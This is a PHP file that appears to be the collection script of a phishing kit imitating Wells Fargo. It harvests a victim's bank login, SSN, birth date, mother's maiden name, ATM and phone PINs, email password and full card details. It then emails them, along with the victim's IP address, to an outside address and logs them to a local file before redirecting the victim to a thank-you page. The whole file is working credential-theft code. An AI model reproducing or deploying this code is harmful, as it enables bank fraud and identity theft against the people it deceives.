<?php
session_start();

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$mereme .= "--------[WF 2020]--------\n";
$mereme .= "UserName: ".$_SESSION['user']."\n";
$mereme .= "Password: ".$_SESSION['pass']."\n";
$mereme .= "--------[Personal]--------\n";
$mereme .= "Full Name : ".$_POST['fname']." ".$_POST['lname']."\n";
$mereme .= "Birth Date: ".$_POST['dob']."\n";
$mereme .= "Address: ".$_POST['street']."\n";
$mereme .= "Zip: ".$_POST['zip']."\n";
$mereme .= "SSN: ".$_POST['ssn']."\n";
$mereme .= "Mother Maiden Name: ".$_POST['mmn']."\n";
$mereme .= "ATM PIN: ".$_POST['drvlc']."\n";
$mereme .= "--------[Comtact]--------\n";
$mereme .= "Phone Number : ".$_POST['PHONE']."\n";
$mereme .= "Phone PIN : ".$_POST['phnp']."\n";
$mereme .= "Email : ".$_POST['EMAIL']."\n";
$mereme .= "Pass: ".$_POST['emap']."\n";
$mereme .= "--------[ATM]--------\n";
$mereme .= "Card: ".$_POST['ccnum']."\n";
$mereme .= "Expiry Date: ".$_POST['ccexpire']."\n";
$mereme .= "CVV: ".$_POST['ccv']."\n";
$mereme .= "--------[By JeRo]--------\n";
$mereme .= "IP: ".$ip."\n";
$mereme .= "Hostname: $hostname\n";
$mereme .= "--------[WF 2020]--------\n";
$recipient = "elsaid.1999@yahoo.com";
$headers = "From: FULL <mail@jero.com>";
$subject = "Wells FULL  $ip";
mail($recipient,$subject,$mereme,$headers);
$file = fopen("max12333.txt", 'a');
fwrite($file, $mereme);

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");

session_destroy();
header("Location: thanks.html?$host-$host-$host$host$host$host$host$host$host$host$host");
?>